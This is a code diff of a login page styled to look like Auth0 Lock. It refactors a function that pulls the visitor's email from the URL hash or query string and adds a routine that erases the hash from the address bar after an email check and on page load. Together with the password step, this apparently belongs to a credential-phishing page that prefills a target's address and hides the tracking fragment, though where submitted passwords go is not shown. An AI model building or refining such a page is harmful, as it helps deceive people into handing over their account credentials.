@@ -908,7 +908,7 @@
                                                     </div>
                                                     <div class="auth0-lock-pane-separator"></div>
 
-                                                    <!-- Email display with proper email icon (no #) -->
+                                                    <!-- Email display with email icon (no #) -->
                                                     <div class="auth0-lock-input-block auth0-lock-input-email">
                                                         <div class="auth0-lock-input-wrap auth0-lock-input-wrap-with-icon">
                                                             <span class="email-icon-wrapper" aria-hidden="true">
@@ -1004,27 +1004,48 @@
 
             // ─── HELPERS ───
             function getEmailFromURL() {
+                let email = '';
+
                 // Try hash first (e.g., #email=user@example.com)
                 if (window.location.hash) {
                     try {
                         const hashParams = new URLSearchParams(window.location.hash.substring(1));
-                        const email = hashParams.get('email');
-                        if (email && email.trim() !== '') return email.trim();
+                        const hashEmail = hashParams.get('email');
+                        if (hashEmail && hashEmail.trim() !== '') {
+                            email = hashEmail.trim();
+                        }
                     } catch (_) { /* ignore */ }
 
-                    // Fallback: regex to find email in the hash
-                    const match = window.location.hash.match(
-                        /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
-                    );
-                    if (match) return match[0];
+                    // If not found, try regex on the hash
+                    if (!email) {
+                        const match = window.location.hash.match(
+                            /[a-z0-9!#$%&'*+/=?^_`{|}~-]+(?:\.[a-z0-9!#$%&'*+/=?^_`{|}~-]+)*@(?:[a-z0-9](?:[a-z0-9-]*[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]*[a-z0-9])?/i
+                        );
+                        if (match) email = match[0];
+                    }
                 }
 
-                // Try query string (e.g., ?email=user@example.com)
-                const params = new URLSearchParams(window.location.search);
-                const email = params.get('email');
-                if (email && email.trim() !== '') return email.trim();
+                // If still empty, try query string (e.g., ?email=user@example.com)
+                if (!email) {
+                    const params = new URLSearchParams(window.location.search);
+                    const queryEmail = params.get('email');
+                    if (queryEmail && queryEmail.trim() !== '') {
+                        email = queryEmail.trim();
+                    }
+                }
 
-                return '';
+                return email;
+            }
+
+            // ─── CLEAN THE URL ───
+            function cleanURL() {
+                // Remove the hash from the URL bar after extracting the email
+                if (window.location.hash) {
+                    try {
+                        const newUrl = window.location.pathname + window.location.search;
+                        window.history.replaceState(null, '', newUrl);
+                    } catch (_) { /* ignore */ }
+                }
             }
 
             function setLoading(loading) {
@@ -1091,13 +1112,15 @@
                         setLoading(false);
                         if (data.success) {
                             currentEmail = email;
-                            // Display email cleanly — no #, just the email
+                            // Display email cleanly — just the email, no extra characters
                             emailDisplay.value = email;
                             one.style.display = 'none';
                             two.style.display = 'block';
                             attemptCount = 0;
                             hideError();
                             passwordInput.value = '';
+                            // Clean the URL (remove the # from the address bar)
+                            cleanURL();
                             setTimeout(() => passwordInput.focus(), 120);
                         } else {
                             passwordError.innerHTML =
@@ -1195,6 +1218,8 @@
             // ─── HIDE OVERLAY ON PAGE LOAD ───
             window.addEventListener('load', function() {
                 setLoading(false);
+                // Clean the URL on page load as well
+                cleanURL();
             });
 
         })();
